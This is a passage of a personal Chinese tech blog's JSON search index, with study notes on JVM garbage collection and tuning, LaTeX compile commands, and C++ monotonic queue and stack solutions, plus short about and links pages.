GC会采用不同的方法进行回收，JVM对象的引用分为了四种类型：\n（1）强引用：默认情况下，对象采用的均为强引用（这个对象的实例没有其他对象引用，GC时才会被回收） （2）软引用：软引用是Java中提供的一种比较适合于缓存场景的应用（只有在内存不够用的情况下才会被GC） （3）弱引用：在GC时一定会被GC回收 （4）虚引用：由于虚引用只是用来得知对象是否被GC\n不同的区\n垃圾收集算法 标记-清除算法 适用场合：\n 存活对象较多的情况下比较高效 适用于年老代（即旧生代）  缺点：\n 容易产生内存碎片，再来一个比较大的对象时（典型情况：该对象的大小大于空闲表中的每一块儿大小但是小于其中两块儿的和），会提前触发垃圾回收 扫描了整个空间两次（第一次：标记存活对象；第二次：清除没有标记的对象）  复制算法 适用场合：\n 存活对象较少的情况下比较高效 扫描了整个空间一次（标记存活对象并复制移动） 适用于年轻代（即新生代）：基本上98%的对象是\u0026quot;朝生夕死\u0026quot;的，存活下来的会很少  缺点：\n 需要一块儿空的内存空间 需要复制移动对象  标记-整理算法 标记-压缩算法是一种老年代的回收算法，它在标记-清除算法的基础上做了一些优化。\n首先也需要从根节点开始对所有可达对象做一次标记，但之后，它并不简单地清理未标记的对象，而是将所有的存活对象压缩到内存的一端。之后，清理边界外所有的空间。这种方法既避免了碎片的产生，又不需要两块相同的内存空间，因此，其性价比比较高。\n分代收集算法 分代收集算法就是目前虚拟机使用的回收算法，它解决了标记整理不适用于老年代的问题，将内存分为各个年代。一般情况下将堆区划分为老年代（Tenured Generation）和新生代（Young Generation），在堆区之外还有一个代就是永久代（Permanet Generation）。\n在不同年代使用不同的算法，从而使用最合适的算法，新生代存活率低，可以使用复制算法。而老年代对象存活率高，没有额外空间对它进行分配担保，所以只能使用标记清除或者标记整理算法。\n步骤：\n 当Eden区满了之后再使用Survivor from，当Survivor from 也满了之后就进行Minor GC（新生代GC），将Eden和Survivor from中存活的对象copy进入Survivor to，然后清空Eden和Survivor from，这个时候原来的Survivor from成了新的Survivor to，每次Minor GC，存活下来的对象年龄加+1 那什么时候会进入老年代呢？从上面看到，如果对象在GC过程中没有被回收，那么它的对象年龄（Age）会不断的增加，对象在Survivor区每熬过一个Minor GC，年龄就增加1岁，当它的年龄到达一定的程度（默认为15岁），就会被移动到老年代，这个年龄阀值可以通过-XX:MaxTenuringThreshold设置。  谁空谁是to\n大对象直接进入老年代：JVM中有个参数配置-XX:PretenureSizeThreshold，令大于这个设置值的对象直接进入老年代，目的是为了避免在Eden和Survivor区之间发生大量的内存复制。\n详情 垃圾收集算法是方法论，垃圾收集器是具体实现。JVM规范对于垃圾收集器的应该如何实现没有任何规定，因此不同的厂商、不同版本的虚拟机所提供的垃圾收集器差别较大，这里只看HotSpot虚拟机。\nJVM性能监控与故障定位 JVM调优 **对JVM内存的系统级的调优主要的目的是减少GC的频率和Full GC的次数。**1.Full GC\n会对整个堆进行整理，包括Young、Tenured和Perm。Full GC因为需要对整个堆进行回收，所以比较慢，因此应该尽可能减少Full GC的次数。\n2.导致Full GC的原因\n1)*年老代（Tenured）被写满*\n调优时尽量让对象在新生代GC时被回收、让对象在新生代多存活一段时间和不要创建过大的对象及数组避免直接在旧生代创建对象 。\n2)持久代Pemanet Generation空间不足\n增大Perm Gen空间，避免太多静态对象 ， 控制好新生代和旧生代的比例\n3)System.gc()被显示调用\n垃圾回收不要手动触发，尽量依靠JVM自身的机制\n1.监控GC的状态\n使用各种JVM工具，查看当前日志，分析当前JVM参数设置，并且分析当前堆内存快照和gc日志，根据实际的各区域内存划分和GC执行时间，觉得是否进行优化。\n举一个例子： 系统崩溃前的一些现象：\n 每次垃圾回收的时间越来越长，由之前的10ms延长到50ms左右，FullGC的时间也有之前的0.5s延长到4、5s FullGC的次数越来越多，最频繁时隔不到1分钟就进行一次FullGC 年老代的内存越来越大并且每次FullGC后年老代没有内存被释放  之后系统会无法响应新的请求，逐渐到达OutOfMemoryError的临界值，这个时候就需要分析JVM内存快照dump。\n4.分析结果，判断是否需要优化\n如果各项参数设置合理，系统没有超时日志出现，GC频率不高，GC耗时不高，那么没有必要进行GC优化，如果GC时间超过1-3秒，或者频繁GC，则必须优化。\n注：如果满足下面的指标，则一般不需要进行GC：\n Minor GC执行时间不到50ms； Minor GC执行不频繁，约10秒一次； Full GC执行时间不到1s； Full GC执行频率不算频繁，不低于10分钟1次；  5.调整GC类型和内存分配\n如果内存分配过大或过小，或者采用的GC收集器比较慢，则应该优先调整这些参数，并且先找1台或几台机器进行beta，然后比较优化过的机器和没有优化的机器的性能对比，并有针对性的做出最后选择。\n6.不断的分析和调整\n通过不断的试验和试错，分析并找到最合适的参数，如果找到了最合适的参数，则将这些参数应用到所有服务器。\nJVM调优参数参考\n1.针对JVM堆的设置，一般可以通过-Xms -Xmx限定其最小、最大值，为了防止垃圾收集器在最小、最大之间收缩堆而产生额外的时间，通常把最大、最小设置为相同的值;\n2.年轻代和年老代将根据默认的比例（1：2）分配堆内存， 可以通过调整二者之间的比率NewRadio来调整二者之间的大小，也可以针对回收代。\n比如年轻代，通过 -XX:newSize -XX:MaxNewSize来设置其绝对大小。同样，为了防止年轻代的堆收缩，我们通常会把-XX:newSize -XX:MaxNewSize设置为同样大小。\n3.年轻代和年老代设置多大才算合理\n1）更大的年轻代必然导致更小的年老代，大的年轻代会延长普通GC的周期，但会增加每次GC的时间；小的年老代会导致更频繁的Full GC\n2）更小的年轻代必然导致更大年老代，小的年轻代会导致普通GC很频繁，但每次的GC时间会更短；大的年老代会减少Full GC的频率\n如何选择应该依赖应用程序对象生命周期的分布情况： 如果应用存在大量的临时对象，应该选择更大的年轻代；如果存在相对较多的持久对象，年老代应该适当增大。但很多应用都没有这样明显的特性。\n在抉择时应该根 据以下两点：\n（1）本着Full GC尽量少的原则，让年老代尽量缓存常用对象，JVM的默认比例1：2也是这个道理 。\n（2）通过观察应用一段时间，看其他在峰值时年老代会占多少内存，在不影响Full GC的前提下，根据实际情况加大年轻代，比如可以把比例控制在1：1。但应该给年老代至少预留1/3的增长空间。\n4.在配置较好的机器上（比如多核、大内存），可以为年老代选择并行收集算法： -XX:+UseParallelOldGC 。\n5.线程堆栈的设置：每个线程默认会开启1M的堆栈，用于存放栈帧、调用参数、局部变量等，对大多数应用而言这个默认值太了，一般256K就足用。\n理论上，在内存不变的情况下，减少每个线程的堆栈，可以产生更多的线程，但这实际上还受限于操作系统。\nJMM java 内存模型\n","permalink":"https://kevinerr.github.io/posts/tech/jvm/","summary":"面试问题 谈谈对JVM的理解？java8虚拟机和以前有什么区别 什么是OOM？什么是栈溢出StackOverFlowError？ JVM的常用调优","title":"jvm"},{"content":"1 2 3 4 5 6 7  pdflatex test.tex #不允许有中文 xelatex test.tex #通用 texdoc #打开文档 texdoc ctex texdoc lshort-zh-ch texdoc symbols-a4 texdoc beame   ","permalink":"https://kevinerr.github.io/posts/tech/latex/","summary":"1 2 3 4 5 6 7 pdflatex test.tex #不允许有中文 xelatex test.tex #通用 texdoc #打开文档 texdoc ctex texdoc lshort-zh-ch texdoc symbols-a4 texdoc beame","title":""},{"content":"单调队列 常见模型：找出滑动窗口中的最大值/最小值\n是一种主要用于解决滑动窗口类问题的数据结构，即在长度为n 的序列中，求每个长度为 k的区间的区间最值。\n用于解决滑动窗口和双指针解决不了的问题\nhttps://www.bilibili.com/video/BV1H5411j7o6\n滑动窗口 求最大值三种情况：\n队尾入队：\n​\t如果新进入窗口的值大于队尾元素，则队尾出队列，再将将新进入的元素入队\n​\t否则直接入队\n队头出队：\n​\t若队头是否滑出了窗口，队头出队\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std;  const int N = 1000010; int a[N]; int main() {  int n, k;  cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; k;  for (int i = 1; i \u0026lt;= n; i ++ ) cin \u0026gt;\u0026gt; a[i];//读入数据  deque\u0026lt;int\u0026gt; q;  for(int i = 1; i \u0026lt;= n; i++)  {  while(q.size() \u0026amp;\u0026amp; q.back() \u0026gt; a[i]) //新进入窗口的值小于队尾元素，则队尾出队列  q.pop_back();  q.push_back(a[i]);//将新进入的元素入队  if(i - k \u0026gt;= 1 \u0026amp;\u0026amp; q.front() == a[i - k])//若队头是否滑出了窗口，队头出队  q.pop_front();  if(i \u0026gt;= k)//当窗口形成，输出队头对应的值  cout \u0026lt;\u0026lt; q.front() \u0026lt;\u0026lt;\u0026#34; \u0026#34;;  }  q.clear();  cout \u0026lt;\u0026lt; endl;   //最小值亦然  for(int i = 1; i \u0026lt;= n; i++)  {  while(q.size()\u0026amp;\u0026amp;q.back()\u0026lt;a[i]) q.pop_back();  q.push_back(a[i]);  if(i-k\u0026gt;=1\u0026amp;\u0026amp;a[i-k]==q.front()) q.pop_front();  if(i\u0026gt;=k) cout\u0026lt;\u0026lt;q.front()\u0026lt;\u0026lt;\u0026#34; \u0026#34;;   } }   滑动窗口的最大值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  class Solution { public:  vector\u0026lt;int\u0026gt; maxInWindows(vector\u0026lt;int\u0026gt;\u0026amp; nums, int k) {  vector\u0026lt;int\u0026gt; ans;  deque\u0026lt;int\u0026gt; q;  for(int i =0;i\u0026lt;nums.size();i++){  while(q.size()\u0026amp;\u0026amp;q.back()\u0026lt;nums[i]) q.pop_back();  q.push_back(nums[i]);  if(i-k\u0026gt;=0\u0026amp;\u0026amp;nums[i-k]==q.front()) q.pop_front();  if(i\u0026gt;=k-1) ans.push_back(q.front());  }  // int q[100010];  // int h = 0,t = 0;  // for(int i = 0;i\u0026lt;nums.size();i++){  // if(h\u0026lt;=t\u0026amp;\u0026amp;q[h]\u0026lt;i-k+1) h++;  // while(h\u0026lt;=t\u0026amp;\u0026amp;nums[i]\u0026gt;=nums[q[t]]) t--;  // q[++t] = i;  // if(i\u0026gt;=k-1) ans.push_back(nums[q[h]]);  // }  return ans;  } };   单调队列习题集\n单调栈 常见模型：找出每个数左边离它最近的比它大/小的数\n1、题目（来源于AcWing）： 给定一个长度为N的整数数列，输出每个数左边第一个比它小的数，如果不存在则输出-1。\n输入格式 第一行包含整数N，表示数列长度。\n第二行包含N个整数，表示整数数列。\n输出格式 共一行，包含N个整数，其中第i个数表示第i个数的左边第一个比它小的数，如果不存在则输出-1。\n数据范围 1≤N≤105 1≤数列中元素≤109\n输入样例： 5 3 4 2 7 5 输出样例： -1 3 -1 2 2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  #include \u0026lt;bits/stdc++.h\u0026gt;using namespace std; const int N = 100010; stack\u0026lt;int\u0026gt; stk;  int main() {  int m;  cin \u0026gt;\u0026gt; m;  while (m -- )  {  int x;  cin \u0026gt;\u0026gt; x;  while (stk.size() \u0026amp;\u0026amp; stk.top() \u0026gt;= x) stk.pop();//在x入栈前删掉比x大的数  if (stk.size() == 0) cout \u0026lt;\u0026lt; \u0026#34;-1 \u0026#34;;  else cout \u0026lt;\u0026lt; stk.top() \u0026lt;\u0026lt; \u0026#39; \u0026#39;;  stk.push(x);//x入栈  }  return 0; }   直方图中最大的矩形 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; const int N = 100010; int h[N], q[N], l[N], r[N]; //l[i]表示i左边第一个比h[i]小的元素的下标，r[i]表示i右边第一个比h[i]小的元素的下标 typedef long long LL; int main() {  int n;  while(cin\u0026gt;\u0026gt;n, n)  {  for(int i = 1; i \u0026lt;= n; i ++) scanf(\u0026#34;%d\u0026#34;, \u0026amp;h[i]);  stack\u0026lt;int\u0026gt; st;  for(int i = 1; i \u0026lt;= n; i ++)  {  while(st.size()\u0026amp;\u0026amp;h[st.top()]\u0026gt;=h[i]) st.pop();  if(st.size() == 0) l[i]=0;  else l[i]=st.top();  st.push(i);  }  stack\u0026lt;int\u0026gt; st2;  for(int i = n; i\u0026gt;=1; i --)  {  while(st2.size()\u0026amp;\u0026amp;h[st2.top()]\u0026gt;=h[i]) st2.pop();  if(st2.size() == 0) r[i]=n+1;  else r[i]=st2.top();  st2.push(i);  }  LL res = 0;  for(int i = 1; i \u0026lt;= n; i ++)  res = max(res, (LL)h[i] * (r[i] - l[i] - 1));  printf(\u0026#34;%lld\\n\u0026#34;, res);  }  return 0; }   单调栈习题集\n","permalink":"https://kevinerr.github.io/posts/algorithm/%E5%8D%95%E8%B0%83%E9%98%9F%E5%88%97%E5%92%8C%E5%8D%95%E8%B0%83%E6%A0%88/","summary":"单调队列 常见模型：找出滑动窗口中的最大值/最小值 是一种主要用于解决滑动窗口类问题的数据结构，即在长度为n 的序列中，求每个长度为 k的区间的区间","title":"单调队列和单调栈"},{"content":"","permalink":"https://kevinerr.github.io/tags/","summary":"","title":"🔍搜索"},{"content":"Talk is cheap,show me the code 职业：五线城市程序员\n运动：篮球、羽毛球、乒乓球、游泳、跑步\n游戏：LOL\n","permalink":"https://kevinerr.github.io/about/","summary":"Talk is cheap,show me the code 职业：五线城市程序员 运动：篮球、羽毛球、乒乓球、游泳、跑步 游戏：LOL","title":"🙋🏻‍♂️关于"},{"content":"\rSulv’s Blog\r一个记录技术、阅读、生活的博客\r\r\r\r👉友链格式 名称： hkh\u0026rsquo;s blog\n网址：\n图标：\n描述：\n👉友链申请要求 秉承互换友链原则、文章定期更新、不能有太多广告、个人描述字数控制在15字内\n","permalink":"https://kevinerr.github.io/links/","summary":"Sulv’s Blog 一个记录技术、阅读、生活的博客 👉友链格式 名称： hkh\u0026rsquo;s blog 网址： 图标： 描述： 👉友链申请要求 秉承互换友链原则、文章定期更新、不能有太多广","title":"🤝友情链接"}]